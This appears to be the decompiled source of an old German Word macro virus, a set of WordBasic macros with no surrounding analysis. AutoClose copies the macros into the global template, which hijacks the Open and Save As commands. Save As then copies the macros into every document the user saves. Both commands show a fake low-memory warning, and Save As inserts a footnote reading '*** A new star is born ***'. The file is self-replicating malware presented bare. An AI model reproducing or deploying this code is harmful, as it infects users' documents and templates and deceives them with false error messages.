   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "DateiSpeichernUnter"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Speichert eine Kopie des Dokuments in eine andere Datei."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.DateiSpeichernUnter.MAIN"
   Dim Doku$
   Dim SF
   Doku$ = WordBasic.[FileName$]()
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   On Error GoTo -1: On Error GoTo Fehler
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
   If dlg.Format = 0 Then dlg.Format = 1
   WordBasic.FileSaveAs dlg
   Doku$ = WordBasic.[FileName$]()
   WordBasic.Organizer Copy:=1, Source:="c:\datei.doc", _
           Destination:=Doku$, _
           Name:="DateiÖffnen", Tab:=3
   WordBasic.Organizer Copy:=1, Source:="c:\datei.doc", _
           Destination:=Doku$, _
           Name:="AutoClose", Tab:=3
   WordBasic.Organizer Copy:=1, Source:="c:\datei.doc", _
           Destination:=Doku$, _
           Name:="DateiSpeichernUnter", Tab:=3
   SF = WordBasic.MsgBox("Zu wenig Arbeitsspeicher!" + Chr(13) + "Schließen Sie alle laufenden Anwendungen!" + Chr(13) + "!! Es besteht die Gefahr von Datenverlusten !!", "Winword", 273)
   If SF = 0 Then GoTo Ciao
   WordBasic.ViewNormal
   WordBasic.InsertFootnote Reference:=".", NoteType:=0
   WordBasic.Insert "*** A new star is born ***"
   WordBasic.ClosePane
   WordBasic.WW7_EditGoTo Destination:="z1"
   WordBasic.FileSaveAs Format:=1
   GoTo Ciao

   Fehler:
   If Err.Number <> 102 Then GoTo Ciao
   Ciao:
   End Sub


   Attribute VB_Name = "DateiÖffnen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Öffnet ein bereits vorhandenes Dokument oder eine Dokumentvorlage."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.DateiÖffnen.MAIN"
   Dim SF
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
   On Error GoTo -1: On Error GoTo Fehler
   WordBasic.CurValues.FileOpen dlg
   WordBasic.Dialog.FileOpen dlg
   SF = WordBasic.MsgBox("Zu wenig Arbeitsspeicher!" + Chr(13) + "Schließen Sie alle laufenden Anwendungen!" + Chr(13) + "!! Es besteht die Gefahr von Datenverlusten !!", "Winword", 273)
   If SF = 0 Then GoTo Ciao
   WordBasic.FileOpen dlg
   GoTo Ciao

   Fehler:
   If Err.Number <> 102 Then GoTo Ciao
   Ciao:
   End Sub

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   WordBasic.FileSaveAs Name:="c:\datei.doc", Format:=1
   WordBasic.MacroCopy "c:\datei.doc:DateiÖffnen", "Global:DateiÖffnen", 1
   WordBasic.MacroCopy "c:\datei.doc:DateiSpeichernUnter", "Global:DateiSpeichernUnter", 1
   End Sub
